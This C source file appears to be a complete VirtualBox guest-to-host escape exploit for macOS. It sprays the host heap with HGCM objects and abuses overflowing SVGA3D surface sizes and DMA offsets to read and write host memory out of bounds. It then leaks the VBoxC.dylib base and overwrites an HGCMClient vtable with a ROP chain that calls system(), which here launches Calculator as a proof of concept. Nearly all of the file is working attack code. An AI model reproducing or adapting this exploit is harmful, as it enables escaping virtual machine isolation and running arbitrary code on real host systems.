#include <err.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <unistd.h>

#include "device.h"
#include "svga3d_reg.h"
#include "hgcm.h"
#include "address.h"
#include "VBoxGuest.h"

#define get_offset(structure, e) __builtin_offsetof(structure, e)

SVGADevice gSVGA;
VBoxGuestPortInfo portinfo;

char *calc = "/Applications/Calculator.app/Contents/MacOS/Calculator";

void
spray_hgcm_connection(uint32_t nobjects)
{
	VMMDevHGCMConnect *connect;
	uint64_t connect_gpa;

	connect = (VMMDevHGCMConnect *) mmap(0, getpagesize(), PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

	connect_gpa = gva_to_gpa((uint64_t)connect);

	connect->loc.type = VMMDevHGCMLoc_LocalHost_Existing;
	strcpy(connect->loc.u.host.achName, "VBoxGuestPropSvc");

	connect->u32ClientID = 0;

	connect->header.result = 0;
	connect->header.fu32Flags = 0;

	connect->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
	connect->header.header.requestType = VMMDevReq_HGCMConnect;
	connect->header.header.size = sizeof(VMMDevHGCMConnect);

	for (int i = 0; i < nobjects; i++) {
		outl(connect_gpa, portinfo.portAddress);
	}

	munmap(connect, getpagesize());
}

void
disconnect_client(uint32_t clientID)
{
	VMMDevHGCMDisconnect *disconnect;
	uint64_t disconnect_gpa;

	disconnect = (VMMDevHGCMDisconnect *) mmap(0, getpagesize(), PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

	disconnect_gpa = gva_to_gpa((uint64_t)disconnect);

	disconnect->u32ClientID = clientID;

	disconnect->header.result = 0;
	disconnect->header.fu32Flags = 0;

	disconnect->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
	disconnect->header.header.requestType = VMMDevReq_HGCMDisconnect;
	disconnect->header.header.size = sizeof(VMMDevHGCMDisconnect);

	outl(disconnect_gpa, portinfo.portAddress);

	munmap(disconnect, getpagesize());

}


void
allocate_surface(uint32_t sid, uint32_t size)
{
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDefineSurface surface = {0};
	SVGA3dSize dsize[2] = {0};

	hdr.size = 48;

	surface.sid = sid;
	surface.surfaceFlags = SVGA3D_SURFACE_HINT_STATIC;
	surface.format = SVGA3D_BUFFER;
	surface.face[0].numMipLevels = 1;
	surface.face[1].numMipLevels = 0;
	surface.face[2].numMipLevels = 0;
	surface.face[3].numMipLevels = 0;
	surface.face[4].numMipLevels = 0;
	surface.face[5].numMipLevels = 0;

	/* Set as much as higher value */
	dsize[0].width  = 0xffffffff;
	dsize[0].height = 0xfffffffe;
	dsize[0].depth  = 0x80000000 + (size / 2);

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DEFINE);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surface.sid);
	VMwareWriteWordToFIFO(surface.surfaceFlags);
	VMwareWriteWordToFIFO(surface.format);
	VMwareWriteWordToFIFO(surface.face[0].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[1].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[2].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[3].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[4].numMipLevels);
	VMwareWriteWordToFIFO(surface.face[5].numMipLevels);
	VMwareWriteWordToFIFO(dsize[0].width);
	VMwareWriteWordToFIFO(dsize[0].height);
	VMwareWriteWordToFIFO(dsize[0].depth);
	VMwareWaitForFB();

}

void
access_memory(uint32_t sid, SVGA3dTransferType type, uint8_t *memory, uint32_t size)
{
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdSurfaceDMA surfacedma = {0};
	SVGA3dCopyBox boxes = {0};

	hdr.size = 64;

	surfacedma.guest.ptr.gmrId  = SVGA_GMR_FRAMEBUFFER;
	surfacedma.guest.ptr.offset = 0;
	surfacedma.guest.pitch      = 1;
	surfacedma.host.sid         = sid;
	surfacedma.host.face        = 0;
	surfacedma.host.mipmap      = 0;
	surfacedma.transfer         = type;

	boxes.x = 0x100000000 - size;
	boxes.y = 0;
	boxes.z = 0;
	boxes.w = size;
	boxes.h = 1;
	boxes.d = 1;
	boxes.srcx = 0;
	boxes.srcy = 0;
	boxes.srcz = 0;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DMA);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.gmrId);
	VMwareWriteWordToFIFO(surfacedma.guest.ptr.offset);
	VMwareWriteWordToFIFO(surfacedma.guest.pitch);
	VMwareWriteWordToFIFO(surfacedma.host.sid);
	VMwareWriteWordToFIFO(surfacedma.host.face);
	VMwareWriteWordToFIFO(surfacedma.host.mipmap);
	VMwareWriteWordToFIFO(surfacedma.transfer);
	VMwareWriteWordToFIFO(boxes.x);
	VMwareWriteWordToFIFO(boxes.y);
	VMwareWriteWordToFIFO(boxes.z);
	VMwareWriteWordToFIFO(boxes.w);
	VMwareWriteWordToFIFO(boxes.h);
	VMwareWriteWordToFIFO(boxes.d);
	VMwareWriteWordToFIFO(boxes.srcx);
	VMwareWriteWordToFIFO(boxes.srcy);
	VMwareWriteWordToFIFO(boxes.srcz);

	/* copy data to framebuffer for writing */
	if (type == SVGA3D_WRITE_HOST_VRAM) {
		memcpy(gSVGA.fbMem, memory, size);
	}

	VMwareWaitForFB();

	/* copy leaked data from framebuffer */
	if (type == SVGA3D_READ_HOST_VRAM) {
		memcpy(memory, gSVGA.fbMem, size);
	}
}

void
free_surface(uint32_t sid)
{
	SVGA3dCmdHeader hdr = {0};
	SVGA3dCmdDestroySurface destroy = {0};

	hdr.size = 4;
	destroy.sid = 0;

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, false);

	VMwareWriteWordToFIFO(SVGA_3D_CMD_SURFACE_DESTROY);
	VMwareWriteWordToFIFO(hdr.size);
	VMwareWriteWordToFIFO(destroy.sid);
	VMwareWaitForFB();
}

struct client_details {
	uint32_t offset;
	uint64_t key;
	uint64_t vboxc_base;
	uint64_t pSelf;
} client_details;

int
find_hgcm_client(uint8_t *memory, int memsize, struct client_details *details)
{

	struct HGCMClient *leaked_client;
	uint64_t vtable, pSelf, pService, key;
	uint64_t vboxc_base;
	uint32_t m_cRefs, m_enmObjType;		

	uint8_t *start = memory;
	uint8_t *stop; 

	stop = start + memsize - sizeof(struct HGCMClient);

	while (memory < stop) {

		leaked_client = (struct HGCMClient *)memory;

		vtable = (uint64_t)leaked_client->vptr_HGCMObject;
		m_cRefs = leaked_client->m_cRefs;
		m_enmObjType = leaked_client->m_enmObjType;
		key = leaked_client->m_core.AvlCore.Key;
		pSelf = (uint64_t)leaked_client->m_core.pSelf;
		pService = (uint64_t)leaked_client->pService;		

		if (((vtable & 0xFFF) == (hgcm_vtable_offset & 0xFFF)) && (m_cRefs > 0) 
				&& (m_enmObjType == HGCMOBJ_CLIENT) && (key > 0) 
				&& (pSelf >> 40 == 0x7f) && (pService >> 40 == 0x7f)) {

			vboxc_base = vtable - hgcm_vtable_offset;
			details->offset = memory - start;
			details->key = key;
			details->vboxc_base = vboxc_base;
			details->pSelf = pSelf;
			return 0;
		}	

		memory += sizeof(uint64_t);
	}

	return -1;
}

int main(int argc, char **argv)
{

	struct client_details details;
	struct HGCMClient *leaked_client;
	uint8_t *memory;
	uint64_t *fake_vtable, *rop;
	char *system_rdi;
	int rv, surface_id;

	if (conf_svga_device() != 0)
		errx(EXIT_FAILURE, "[!] Error initializing SVGA device");

	if (conf_vmm_device() != 0)
		errx(EXIT_FAILURE, "[!] Error initializing VMM device");

	SVGA_WriteReg(SVGA_REG_WIDTH, 0x320);
	SVGA_WriteReg(SVGA_REG_HEIGHT, 0x260);
	SVGA_WriteReg(SVGA_REG_BITS_PER_PIXEL, 32);

	warnx("[+] Spraying the heap with HGCM connection objects...");	
	spray_hgcm_connection(0x100000);

	warnx("[+] Filling the heap with SVGA surfaces. This will take sometime...");
	for (int i = 0; i < SVGA3D_MAX_SURFACE_IDS; i++) {
		allocate_surface(i, 127 * 1024);		// 127 KB allocations
	}

	memory = malloc(0x1000);
	warnx("[+] Locating HGCM object in heap...");

	/* leak memory */
	for (int i = SVGA3D_MAX_SURFACE_IDS - 1; i >= 0; i--) {
		access_memory(i, SVGA3D_READ_HOST_VRAM, memory, 0x1000);
		rv = find_hgcm_client(memory, 0x1000, &details);
		if (rv == 0) {
			surface_id = i;
			break;
		}
	}

	warnx("[+] Using Surface ID 0x%x", surface_id);
	warnx("[+] HGCM client object found @ 0x%lx", details.pSelf);
	warnx("[+] VBoxC.dylib @ 0x%lx", details.vboxc_base);
	warnx("[+] ClientID = 0x%lx", details.key);

	leaked_client = (struct HGCMClient *)(memory + details.offset);
	leaked_client[0].vptr_HGCMObject = (void *)(details.pSelf + get_offset(struct HGCMClient, pvData));

	fake_vtable = (uint64_t *)&leaked_client[0].pvData;
	*fake_vtable++ = pop_rsp + details.vboxc_base;
	*fake_vtable++ = push_rax + details.vboxc_base;
	*fake_vtable++ = 0x4242424242424242;	

	*fake_vtable++ = ret + details.vboxc_base;
	*fake_vtable++ = pop_pop_pop_ret + details.vboxc_base;

	rop = (uint64_t *)&leaked_client[1].m_core.pSelf;
	*rop++ = pop_rdi + details.vboxc_base;
	*rop++ = got_stack_chk_fail + details.vboxc_base;
	*rop++ = mov_rax_mem_rdi_pop + details.vboxc_base;
	*rop++ = 0x4242424242424242;
	*rop++ = pop_rcx + details.vboxc_base;
	*rop++ = libsystem_c_system - libsystem_c_stack_chk_fail;
	*rop++ = pop_pop_pop_ret + details.vboxc_base;

	rop = (uint64_t *)&leaked_client[2].m_core.pSelf;
	*rop++ = pop_rdi + details.vboxc_base;
	*rop++ = details.pSelf + sizeof(struct HGCMClient) * 3 + get_offset(struct HGCMClient, m_core.pSelf);
	*rop++ = add_rax_rcx_jmp_rax + details.vboxc_base;
	*rop++ = 0xdeadbeef00000000; 
	*rop++ = 0xdeadbeef00000000; 
	*rop++ = 0xdeadbeef00000000; 
	*rop++ = 0xdeadbeef00000000; 

	system_rdi = (char *)&leaked_client[3].m_core.pSelf;
	memcpy(system_rdi, calc, strlen(calc));	

	warnx("[+] Overwriting HGCM client object...");
	access_memory(surface_id, SVGA3D_WRITE_HOST_VRAM, memory, 0x1000);

	warnx("[+] Triggering payload...");
	disconnect_client(details.key);

	return 0;
}
